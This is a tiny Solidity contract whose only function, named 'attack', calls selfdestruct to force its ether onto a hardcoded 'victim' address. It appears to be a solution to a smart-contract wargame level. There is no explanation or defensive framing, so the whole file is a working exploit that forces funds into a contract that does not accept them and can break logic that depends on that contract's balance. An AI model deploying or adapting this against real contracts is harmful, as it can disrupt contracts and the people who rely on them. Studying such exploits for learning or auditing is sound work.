pragma solidity ^0.8.0;

contract selfdes {

  constructor() {}

  function attack() public payable {
    address payable victim = payable(0xcd26Aa370C503b2e3C114614C277F78ef0C1cf34);
    selfdestruct(victim);
  }
}